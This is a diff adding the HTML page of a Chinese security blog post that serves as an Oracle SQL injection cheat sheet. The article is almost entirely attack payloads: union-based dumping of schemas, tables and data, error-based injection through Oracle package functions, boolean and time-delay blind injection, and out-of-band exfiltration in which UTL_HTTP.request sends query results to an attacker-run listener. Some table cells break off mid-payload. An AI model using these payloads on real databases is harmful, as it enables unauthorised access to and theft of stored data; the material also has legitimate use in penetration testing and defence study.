@@ -1,0 +1,1167 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+  <meta charset="UTF-8">
+  <meta 
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta 
+    http-equiv="X-UA-Compatible" 
+    content="ie=edge">
+  <meta 
+    name="theme-color" 
+    content="#fff" 
+    id="theme-color">
+  <meta 
+    name="description" 
+    content="Chen">
+  <link 
+    rel="icon" 
+    href="/img/favicon.png">
+  <title>Oracle注入</title>
+  
+    
+      <meta 
+        property="og:title" 
+        content="Oracle注入">
+    
+    
+      <meta 
+        property="og:url" 
+        content="https://www.zerochen.top/article/Oracle%E6%B3%A8%E5%85%A5/index.html">
+    
+    
+      <meta 
+        property="og:img" 
+        content="/img/logo.png">
+    
+    
+    
+      <meta 
+        property="og:type" 
+        content="article">
+      <meta 
+        property="og:article:published_time" 
+        content="2021-08-05">
+      <meta 
+        property="og:article:modified_time" 
+        content="2021-08-12">
+      <meta 
+        property="og:article:author" 
+        content="沉墨">
+      
+        
+          <meta 
+            property="og:article:tag" 
+            content="Oracle">
+        
+      
+    
+  
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+    function loadCSS(href, data, attr) {
+      var sheet = document.createElement('link');
+      sheet.ref = 'stylesheet';
+      sheet.href = href;
+      sheet.dataset[data] = attr;
+      document.head.appendChild(sheet);
+    }
+    function changeCSS(cssFile, data, attr) {
+      var oldlink = document.querySelector(data);
+      var newlink = document.createElement("link");
+      newlink.setAttribute("rel", "stylesheet");
+      newlink.setAttribute("href", cssFile);
+      newlink.dataset.prism = attr;
+      document.head.replaceChild(newlink, oldlink);
+    }
+  </script>
+  
+    
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+  </script>
+  
+    <script>
+      var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+        document.getElementById('theme-color').dataset.mode = getCssMediaQuery();
+      }
+    };
+    setDarkmode();
+    </script>
+  
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+    
+    <link rel="prefetch" href="//unpkg.com/valine/dist/Valine.min.js" as="script">
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+  
+    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <div class="wrapper">
+       
+      <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+        <img 
+          class="navbar-logo-img" 
+          src="/img/favicon.png" 
+          alt="blog logo">
+      
+      <span class="navbar-logo-dsc">沉墨的小小技术圈</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+      <a 
+        href="/" 
+        class="navbar-menu-item">
+        
+          首页
+        
+      </a>
+    
+      <a 
+        href="/archives" 
+        class="navbar-menu-item">
+        
+          归档
+        
+      </a>
+    
+      <a 
+        href="/tags" 
+        class="navbar-menu-item">
+        
+          标签
+        
+      </a>
+    
+      <a 
+        href="/categories" 
+        class="navbar-menu-item">
+        
+          分类
+        
+      </a>
+    
+      <a 
+        href="/about" 
+        class="navbar-menu-item">
+        
+          关于
+        
+      </a>
+    
+      <a 
+        href="/links" 
+        class="navbar-menu-item">
+        
+          友链
+        
+      </a>
+    
+    <a 
+      class="navbar-menu-item darknavbar" 
+      id="dark">
+      <i class="iconfont icon-weather"></i>
+    </a>
+    <a 
+      class="navbar-menu-item searchnavbar" 
+      id="search">
+      <i 
+        class="iconfont icon-search" 
+        style="font-size: 1.2rem; font-weight: 400;">
+      </i>
+    </a>
+  </div>
+</nav> 
+      
+      <div 
+        id="local-search" 
+        style="display: none">
+        <input
+          class="navbar-menu-item"
+          id="search-input"
+          placeholder="请输入搜索内容..." />
+        <div id="search-content"></div>
+      </div>
+      
+      <div class="section-wrap">
+        <div class="container">
+          <div class="columns">
+            <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      Oracle注入
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2021-08-05T03:13:59.000Z">
+      <i 
+        class="iconfont icon-calendar" 
+        style="margin-right: 2px;">
+      </i>
+      <span>2021-08-05</span>
+    </time>
+    
+      <span class="dot"></span>
+      
+        <a 
+          href="/categories/Web%E6%B8%97%E9%80%8F/" 
+          class="post-meta-link">
+          Web渗透
+        </a>
+      
+    
+    
+      <span class="dot"></span>
+      <span>1.7k 字</span>
+    
+  </div>
+  
+    <div 
+      class="post-meta post-show-meta" 
+      style="margin-top: -10px;">
+      <div style="display: flex; align-items: center;">
+        <i 
+          class="iconfont icon-biaoqian" 
+          style="margin-right: 2px; font-size: 1.15rem;">
+        </i>
+        
+          
+          <a 
+            href="/tags/Oracle/" 
+            class="post-meta-link">
+            Oracle
+          </a>
+        
+      </div>
+    </div>
+  
+  </header>
+  <div 
+    id="section" 
+    class="post-content">
+    <p><strong>端口：1521</strong></p>
+<p><strong>使用</strong></p>
+<p>select * from dual; dual是oracle数据库中的虚拟表，用于占位查询</p>
+<p>注释：–</p>
+<p>chr(126)为~，为分隔符</p>
+<p>utl_url.escape() url编码</p>
+<p>对限定条件编码，解决dns外带乱码问题</p>
+<p>&lt;&gt;可替代not in，用于嵌套查询，但是可用limit代替</p>
+<h1 id="一、union联合注入"><a href="#一、union联合注入" class="headerlink" title="一、union联合注入"></a>一、union联合注入</h1><table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">判断注入</td>
+<td align="left"><code>&#39;、&quot;、\、and 1=1、and 1=2</code></td>
+</tr>
+<tr>
+<td align="left">判断数据库类型</td>
+<td align="left">返回正常为oracle数据库 <br><code>and len(&#39;a&#39;) = 1</code> <br><br>长度函数 <br> <code>and exist(select * from dual) dual表</code><br><code>and (select count(*) from user_tables)&gt;0 --</code> <br><code>user_tables 系统表</code></td>
+</tr>
+<tr>
+<td align="left">判断列数</td>
+<td align="left">order by</td>
+</tr>
+<tr>
+<td align="left">判断占位符</td>
+<td align="left">oracle数据库需要查询类型与表结构类型匹配，否则报错 使用时查询处一个数字型和一个字符型显示位即可，其余位用null占位<br>如： <br><code>union select 1,&#39;2&#39;,null,null from dual--</code></td>
+</tr>
+<tr>
+<td align="left">获取基本信息</td>
+<td align="left">获取数据库版本 <br><code>union select 1,(select banner from sys.v_$version where rownum=1),3,4 from dual--</code>  <br><br>获取数据路连接用户名 <br><code>union select 1,(select sys_context(&#39;USERENV&#39;,&#39;CURRENT_USER&#39;) from dual),3,4 from dual--</code> <br><br>或 <br><code>union select 1,(select user from dual),3,4 from dual--</code>  <br><br>获取日志文件绝对路径 <br><code>union select 1,(select instance_name from v$instance),3,4 from dual--</code></td>
+</tr>
+<tr>
+<td align="left">查数据库名</td>
+<td align="left"><code>union select 1,cast(owner as varchar(4000)),3,4 from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1--</code></td>
+</tr>
+<tr>
+<td align="left">查表名</td>
+<td align="left"><code>union select 1,cast(table_name as varchar(4000)),3,4 from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1-- </code><br><br>或 <br><code>union select 1,cast(table_name as varchar(4000)),3,4 from (select table_name,rownum as limit from (select distinct(table_name) from all_tables where owner=&#39;库名&#39;)) where limit=1--</code></td>
+</tr>
+<tr>
+<td align="left">查字段名</td>
+<td align="left"><code>union select 1,cast(column_name as varchar(4000)),3,4 from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1--</code></td>
+</tr>
+<tr>
+<td align="left">查数据</td>
+<td align="left"><code>union select 1,cast(namepwd as varchar(4000)),3,4 from (select name,pwd,rownum as limit from (select * from 字段名)) where limit=1 --</code></td>
+</tr>
+</tbody></table>
+<h1 id="二、报错注入"><a href="#二、报错注入" class="headerlink" title="二、报错注入"></a>二、报错注入</h1><p><strong>常用报错函数</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">dbms_xdb_version.checkin()</td>
+<td align="left">检入签出的VCR并返回新创建的版本的资源ID <br><code>and (select dbms_xdb_version.checkin((select user from dual))from dual)is not null</code></td>
+</tr>
+<tr>
+<td align="left">dbms_xdb_version.uncheckout()</td>
+<td align="left">同checkin <br><code>and (select dbms_xdb_version.uncheckout((select user from dual))from dual)is not null</code></td>
+</tr>
+<tr>
+<td align="left">utl_inaddr.get_host_name()</td>
+<td align="left">在Oracle 11g及以后的版本中需要网络访问权限才可以使用 获取ip地址，其参数如果解析不了会报错 <br><code>and utl_inaddr.get_host_name((select user from dual))=1--</code></td>
+</tr>
+<tr>
+<td align="left">dbms_xdb_version.makeversioned()</td>
+<td align="left"><code>and (select dbms_xdb_version.makeversioned((select user from dual))from dual)is not null--</code></td>
+</tr>
+<tr>
+<td align="left">dbms_utility.sqlid_to_sqlhash()</td>
+<td align="left"><code>and (select dbms_utility.sqlid_to_sqlhash((select user from dual))from dual)is not null--</code></td>
+</tr>
+<tr>
+<td align="left">ordsys.ord_dicom.getmappingxpath()</td>
+<td align="left"><code>and ordsys.ord_dicom.getmappingxpath((select user from dual),user,user)=1--</code></td>
+</tr>
+<tr>
+<td align="left">ctxsys.drithsx.sn()</td>
+<td align="left"><code>and ctxsys.drithsx.sn(1,(select user from dual))=1--</code></td>
+</tr>
+</tbody></table>
+<p><strong>过程</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">获取数据库版本</td>
+<td align="left"><code>and(select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1))from dual)is not null--</code></td>
+</tr>
+<tr>
+<td align="left">获取数据库名称（或当前用户名）</td>
+<td align="left"><code>and (select dbms_xdb_version.checkin((select user from dual))from dual)is not null-- </code><br><br>或<br><code>and (select dbms_xdb_version.checkin((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1)) from dual) is not null --</code></td>
+</tr>
+<tr>
+<td align="left">获取表名</td>
+<td align="left"><code>and (select dbms_xdb_version.checkin((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1)) from dual) is not null --</code> <br><br>或 <br><code>and (select dbms_xdb_version.checkin((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from all_tables where onwer=&#39;库名&#39;)) where limit=1)) from dual) is not null --</code></td>
+</tr>
+<tr>
+<td align="left">获取字段名</td>
+<td align="left"><code>and (select dbms_xdb_version.checkin((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1)) from dual) is not null --</code></td>
+</tr>
+<tr>
+<td align="left">获取数据</td>
+<td align="left">`and(select dbms_xdb_version.checkin((select AGE</td>
+</tr>
+</tbody></table>
+<h1 id="三、布尔盲注"><a href="#三、布尔盲注" class="headerlink" title="三、布尔盲注"></a>三、布尔盲注</h1><p>相关函数</p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">decode()</td>
+<td align="left">if(条件==值1)à返回翻译值1，否则返回默认值 <br>decode(条件,值1,翻译值1,值2,翻译值2,…值n,翻译值n,缺省值)</td>
+</tr>
+<tr>
+<td align="left">instr()</td>
+<td align="left">返回发现指定的字符的位置 <br>instr(string1,string2)<br>instr(源字符串,目标字符串)</td>
+</tr>
+</tbody></table>
+<p>1、猜解法（获取长度把substr改为length即可）</p>
+<table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">判断数据库名（用户名）</td>
+<td align="left"><code>and (select ascii(substr(user,1,1))from dual)&gt;1--</code> <br><br>或 <br><code>and (select ascii(substr((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1),1,1))from dual)&gt;1--</code></td>
+</tr>
+<tr>
+<td align="left">判断表名</td>
+<td align="left"><code>and (select ascii(substr(table_name,1,1)) from user_tables where rownum=1)&gt;1--</code></td>
+</tr>
+<tr>
+<td align="left">判断字段名</td>
+<td align="left"><code>and (select ascii(substr((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1),1,1))from dual)&gt;1--</code></td>
+</tr>
+<tr>
+<td align="left">判断数据</td>
+<td align="left">`and (select ascii(substr((select AGE</td>
+</tr>
+</tbody></table>
+<p>2、decode</p>
+<table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">判断数据库名（用户名）</td>
+<td align="left"><code>and(select decode(substr(user,1,1),&#39;T&#39;,1,0)from dual)=1-- </code><br><br>或 <br><code>and(select decode(substr((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)=1--</code></td>
+</tr>
+<tr>
+<td align="left">判断表名</td>
+<td align="left"><code>and(select decode(substr((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)=1–</code></td>
+</tr>
+<tr>
+<td align="left">判断字段名</td>
+<td align="left"><code>and(select decode(substr((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)=1--</code></td>
+</tr>
+<tr>
+<td align="left">判断数据</td>
+<td align="left"><code>and(select decode(substr((select AGE from (select AGE,rownum as limit from (select * from 字段名)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)=1--</code></td>
+</tr>
+</tbody></table>
+<p>3、instr</p>
+<table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">判断数据库名（用户名）</td>
+<td align="left"><code>and (instr((select user from dual),&#39;T&#39;))=1–</code> <br><br>或 <br><code>and(instr((select (select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1) from dual),&#39;T&#39;))=1--</code></td>
+</tr>
+<tr>
+<td align="left">判断表名</td>
+<td align="left"><code>and (instr((select (select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1) from dual),&#39;T&#39;))=1--</code></td>
+</tr>
+<tr>
+<td align="left">判断字段名</td>
+<td align="left"><code>and (instr((select (select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1) from dual),&#39;T&#39;))=1--</code></td>
+</tr>
+<tr>
+<td align="left">判断数据</td>
+<td align="left"><code>and (instr((select (select AGE from (select AGE,rownum as limit from (select * from 字段名)) where limit=1) from dual),&#39;T&#39;))=1--</code></td>
+</tr>
+</tbody></table>
+<h1 id="四、延时盲注"><a href="#四、延时盲注" class="headerlink" title="四、延时盲注"></a>四、延时盲注</h1><p>相关函数</p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">decode()</td>
+<td align="left"><code>decode(condition,value,dbms_pipe.receive_message(&#39;ICQ&#39;,5),0)</code></td>
+</tr>
+<tr>
+<td align="left">DBMS_PIPE.RECEIVE_MESSAGE()</td>
+<td align="left"><code>DBMS_PIPE.RECEIVE_MESSAGE(&#39;任意值&#39;,延迟时间) </code><br><code>and dbms_pipe.receive_message(&#39;ICQ&#39;,5)=1</code></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">判断数据库名（用户名）</td>
+<td align="left"><code>and(select decode(substr(user,1,1),&#39;T&#39;,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code> <br><br>或 <br><code>and(select decode(substr((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1),1,1),’T’,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code></td>
+</tr>
+<tr>
+<td align="left">判断表名</td>
+<td align="left"><code>and(select decode(substr((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1),1,1),&#39;T&#39;,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code></td>
+</tr>
+<tr>
+<td align="left">判断字段名</td>
+<td align="left"><code>and(select decode(substr((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1),1,1),&#39;T&#39;,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code></td>
+</tr>
+<tr>
+<td align="left">判断数据</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<h1 id="五、DNS外带"><a href="#五、DNS外带" class="headerlink" title="五、DNS外带"></a>五、DNS外带</h1><p>DNS外带函数</p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">UTL_HTTP.REQUEST</td>
+<td align="left">用于取得web服务器的请求信息 <br><code>select UTL_HTTP.REQUEST(&#39;http://www.baidu.com&#39;) from dual</code> <br>返回百度的html源码</td>
+</tr>
+<tr>
+<td align="left">UTL_INADDR.GET_HOST_ADDRESS</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">SYS.DBMS_LDAP.INIT</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<p>外带注入过程</p>
+<table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">检测函数是否可用</td>
+<td align="left"><code>and exists(select count(*) from all_objects where object_name=&#39;UTL_HTTP&#39;)--</code> <br>回显正常则可用</td>
+</tr>
+<tr>
+<td align="left">开启本地监听</td>
+<td align="left"><code>python -m http.server 1111</code></td>
+</tr>
+<tr>
+<td align="left">反弹信息</td>
+<td align="left">`and UTL_HTTP.request(‘<a href="http://ip:监听端口/&#39;">http://ip:监听端口/&#39;</a></td>
+</tr>
+</tbody></table>
+
+  </div>
+  <div>
+    
+      <div 
+        class="post-note note-warning copyright" 
+        style="margin-top: 42px">
+        <p>
+          <span style="font-weight: bold;">作者：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="/about">
+            沉墨
+          </a>
+        </p>
+        <p>
+          <span style="font-weight: bold;">文章链接：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="https://www.zerochen.top/article/Oracle%E6%B3%A8%E5%85%A5/">
+            https://www.zerochen.top/article/Oracle%E6%B3%A8%E5%85%A5/
+          </a>
+        </p>
+        <p><span style="font-weight: bold;">版权声明：</span>转载请注明出处！</p>
+      </div>
+    
+  </div>
+</article>
+<div class="nav">
+  
+    <div class="nav-item-prev">
+      <a 
+        href="/article/Nosql%E6%B3%A8%E5%85%A5/" 
+        class="nav-link">
+        <i class="iconfont icon-left nav-prev-icon"></i>
+        <div>
+          <div class="nav-label">上一篇</div>
+          
+            <div class="nav-title">Nosql注入 </div>
+          
+        </div>
+      </a>
+    </div>
+  
+  
+    <div class="nav-item-next">
+      <a 
+        href="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" 
+        class="nav-link">
+        <div>
+          <div class="nav-label">下一篇</div>
+          
+            <div class="nav-title">Ueditor漏洞复现 </div>
+          
+        </div>
+        <i class="iconfont icon-right nav-next-icon"></i>
+      </a>
+    </div>
+  
+</div>
+
+  <div 
+    class="card card-content comment-card" 
+    style="margin-top: 16px;">
+    <div class="comment-card-title">评论</div>
+    
+  <div id="vcomments"></div>
+  
+  <script>
+    loadScript("//unpkg.com/valine/dist/Valine.min.js");
+    var oldLoadVa = window.onload;
+    window.onload = function () {
+      oldLoadVa && oldLoadVa();
+      new Valine({
+        el: '#vcomments',
+        appId: '2ShT4MB47jbSbE00Kn5TgK8j-gzGzoHsz',
+        appKey: 'eC6yijqvttNWfHdJogIgmhA4',
+        placeholder: 'Just go go',
+        path: window.location.pathname,
+        avatar: 'mp',
+        meta: ["nick","mail","link"],
+        pageSize: '10',
+        lang: '',
+        visitor: 'false',
+        highlight: true,
+        recordIP: false,
+        
+        
+        
+        enableQQ: 'false',
+        requiredFields: [],
+      });
+    };
+  </script>
+
+  </div>
+
+<div 
+  class="card card-content toc-card" 
+  id="mobiletoc">
+  <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-text">一、union联合注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">二、报错注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">三、布尔盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8"><span class="toc-text">四、延时盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81DNS%E5%A4%96%E5%B8%A6"><span class="toc-text">五、DNS外带</span></a></li></ol>
+</div></main>
+            <aside class="left-column">
+              
+              <div class="card card-author">
+                
+  <img 
+    src="/img/logo.png" 
+    class="author-img" 
+    alt="author avatar">
+
+<p class="author-name">沉墨</p>
+<p class="author-description">谨言多思，野蛮生长</p>
+<div class="author-message">
+  <a 
+    class="author-posts-count" 
+    href="/archives">
+    <span>43</span>
+    <span>文章</span>
+  </a>
+  <a 
+    class="author-categories-count" 
+    href="/categories">
+    <span>9</span>
+    <span>分类</span>
+  </a>
+  <a 
+    class="author-tags-count" 
+    href="/tags">
+    <span>43</span>
+    <span>标签</span>
+  </a>
+</div>
+
+              </div>
+               <div class="sticky-tablet">
+  
+  
+    <article class="display-when-two-columns spacer">
+      <div class="card card-content toc-card">
+        <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-text">一、union联合注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">二、报错注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">三、布尔盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8"><span class="toc-text">四、延时盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81DNS%E5%A4%96%E5%B8%A6"><span class="toc-text">五、DNS外带</span></a></li></ol>
+      </div>
+    </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header">
+    <i 
+      class="iconfont icon-fenlei" 
+      style="padding-right: 2px;">
+    </i>分类
+  </div>
+  <div class="categories-list">
+    
+      <a href="/categories/Web%E6%B8%97%E9%80%8F/">
+        <div class="categories-list-item">
+          Web渗透
+          <span class="categories-list-item-badge">20</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          编程基础
+          <span class="categories-list-item-badge">3</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          网络基础
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+        <div class="categories-list-item">
+          漏洞复现
+          <span class="categories-list-item-badge">5</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        <div class="categories-list-item">
+          环境搭建
+          <span class="categories-list-item-badge">6</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Linux/">
+        <div class="categories-list-item">
+          Linux
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Python/">
+        <div class="categories-list-item">
+          Python
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Windows/">
+        <div class="categories-list-item">
+          Windows
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E9%99%84%E5%8A%A0%E6%8A%80%E8%83%BD/">
+        <div class="categories-list-item">
+          附加技能
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header">
+    <i 
+      class="iconfont icon-biaoqian" 
+      style="padding-right: 2px;">
+    </i>热门标签
+  </div>
+  <div class="tags-list">
+    
+      <a 
+        href="/tags/%E9%9A%8F%E8%AE%B0/" 
+        title="随记">
+        <div class="tags-list-item">随记</div>
+      </a>
+    
+      <a 
+        href="/tags/Redis/" 
+        title="Redis">
+        <div class="tags-list-item">Redis</div>
+      </a>
+    
+      <a 
+        href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" 
+        title="逻辑漏洞">
+        <div class="tags-list-item">逻辑漏洞</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" 
+        title="网络协议">
+        <div class="tags-list-item">网络协议</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" 
+        title="文件包含">
+        <div class="tags-list-item">文件包含</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
+        title="文件上传">
+        <div class="tags-list-item">文件上传</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8D%9A%E5%AE%A2/" 
+        title="博客">
+        <div class="tags-list-item">博客</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81/" 
+        title="直播推流">
+        <div class="tags-list-item">直播推流</div>
+      </a>
+    
+      <a 
+        href="/tags/Nginx/" 
+        title="Nginx">
+        <div class="tags-list-item">Nginx</div>
+      </a>
+    
+      <a 
+        href="/tags/Apache/" 
+        title="Apache">
+        <div class="tags-list-item">Apache</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" 
+        title="命令执行">
+        <div class="tags-list-item">命令执行</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8F%8D%E5%BC%B9shell/" 
+        title="反弹shell">
+        <div class="tags-list-item">反弹shell</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%8F%90%E6%9D%83/" 
+        title="提权">
+        <div class="tags-list-item">提权</div>
+      </a>
+    
+      <a 
